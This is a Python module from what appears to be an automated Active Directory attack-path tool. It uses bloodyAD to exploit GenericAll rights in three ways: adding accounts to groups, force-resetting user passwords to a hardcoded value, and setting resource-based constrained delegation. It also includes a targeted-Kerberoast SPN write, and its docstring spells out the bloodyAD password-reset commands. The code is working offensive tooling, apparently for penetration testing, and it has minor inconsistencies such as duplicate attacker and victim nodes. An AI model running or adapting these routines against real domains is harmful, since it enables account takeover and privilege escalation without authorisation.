# strategies/generic_ all.py

from dataclasses import dataclass
from .exploit_strategy import ExploitStrategy
from entities.edge import Edge
from entities.node import Node
from entities.node_kind import NodeKind
from entities.exploit_result import ExploitResult
from entities.edge_kind import EdgeKind
from exceptions.hop_failed_error import HopFailedError
from services.printing import print_check, print_warning, print_done
from utils.runner import run_tool
from utils.platform import BACKEND
from utils.runner import run_tool
from utils.cred_store import enrich_creds

@dataclass
class GenericAllStrategy(ExploitStrategy):
    # Attributes
    edge  : Edge

    @property
    def attacker(self) -> Node:
        return self.edge.source_node

    @property
    def target(self) -> Node:
        return self.edge.goal_node
    
    @property
    def victim(self) -> Node:
        return self.edge.source_node
    
    # Inherited Methods
    def can_exploit(self) -> bool:
        return self.edge.kind == EdgeKind.GENERIC_ALL # Generic_Write

    def exploit(self, creds: dict) -> ExploitResult: # Creds class?
        creds = {**creds, "username": self.attacker.sam()}
        creds = enrich_creds(creds)
        if BACKEND.name == "none":
            raise HopFailedError(
                self.edge,
                "No backend available. Run: pip install bloodyAD  "
                "(or on Windows: wsl pip install bloodyAD)"
            )

        print_check(
            f"GenericWrite [{BACKEND.name}]: "
            f"{self.attacker.label} ──▶ {self.target.label}"
        )

        match self.target.kind:
            case NodeKind.GROUP:
                return self._add_member(creds)
            case NodeKind.USER:
                return self._force_change_password(creds) # TODO : Add _targeted_kerberoast() & _shadow_credentials_attack
            case NodeKind.COMPUTER:
                return self._rbcd(creds)
            case _:
                raise HopFailedError(
                    self.edge,
                    f"GenericWrite on {self.target.kind.value} — no known technique yet"
                )
            
    def _force_change_password(self, creds: dict) -> ExploitResult:
        """
        if password known : bloodyad -H "DomainController" -d "domain.local" -u "ControlledUser"\
                             -p  "Password" set password "TargetUser" "newP@ssword2022"
        if hash known : bloodyad -H "DomainController" -d "domain.local" -u "ControlledUser" \
                            -p  ":NT_hash" -f rc4 set password "TargetUser" "newP@ssword2022"
        creds should have : dc_ip, domain, attacker, password/hash, target
        """
        target_sam  = self.target.sam()
        new_password = "AutoPwn@1337!" # hardcoded here
        ok, output = run_tool(_bloodyad(creds, subcommand=[
    		"set", "password", target_sam, new_password
		]))
        if not ok:
            raise HopFailedError(self.edge, f"Force change password failed:\n{output}")
        print_done(f"Password changed for {target_sam} → {new_password}")
        return ExploitResult(
            technique="ForceChangePassword", # TODO : made this a dictionnary, maybe techniques could be files?
            edge=self.edge,
            success=True,
            notes=f"Administrator password reset to: {new_password}\n"
                  f"You can now use credentials:\n"
                  f"  Username: {target_sam}\n"
                  f"  Password: {new_password}\n"
                  f"  Domain: {creds['domain']}",
            gained_access={
                "username": target_sam,
                "password": new_password,
                "domain": creds.get("domain"),
                "dc_ip": creds.get("dc_ip")
            }
        )

    def _add_member(self, creds: dict) -> ExploitResult:
        group_sam  = self.target.sam()
        victim_sam = self.victim.sam()

        ok, output = run_tool(_bloodyad(creds, [
            "add", "groupMember", group_sam, victim_sam
        ]))

        if not ok:
            raise HopFailedError(self.edge, f"AddMember failed:\n{output}")

        print_done(f"{victim_sam} added to {group_sam}")
        return ExploitResult(success=True, output=output, technique="AddMember")

    def _targeted_kerberoast(self, creds: dict) -> ExploitResult:
        target_sam = self.target.sam()

        ok, output = run_tool(_bloodyad(creds, [
            "set", "object", target_sam,
            "servicePrincipalNames",
            f"fake/roast.{creds['domain']}"
        ]))

        if not ok:
            raise HopFailedError(self.edge, f"SPN write failed:\n{output}")

        print_done(f"SPN set on {target_sam} — ready to Kerberoast")
        return ExploitResult(success=True, output=output, technique="TargetedKerberoast")

    def _rbcd(self, creds: dict) -> ExploitResult:
        target_sam   = self.target.sam()
        attacker_sam = self.attacker.sam()

        ok, output = run_tool(_bloodyad(creds, [
            "add", "rbcd", target_sam, attacker_sam
        ]))

        if not ok:
            raise HopFailedError(self.edge, f"RBCD write failed:\n{output}")

        print_done(f"RBCD set: {attacker_sam} → {target_sam}")
        return ExploitResult(success=True, output=output, technique="RBCD")

# ── Helpers ───────────────────────────────────────────────────────────────────

# TODO: Add support to add/set/remove subcommands clearly
def _bloodyad(creds: dict, subcommand: list[str]) -> list[str]: #creds maybe class?
    cmd = [
        "-H", creds["dc_ip"],
        "-d", creds["domain"],
        "-u", creds["username"],
    ]
    cmd += ["-p", creds.get("secret","")]
    print(f"DEBUG : {cmd + subcommand}")
    return cmd + subcommand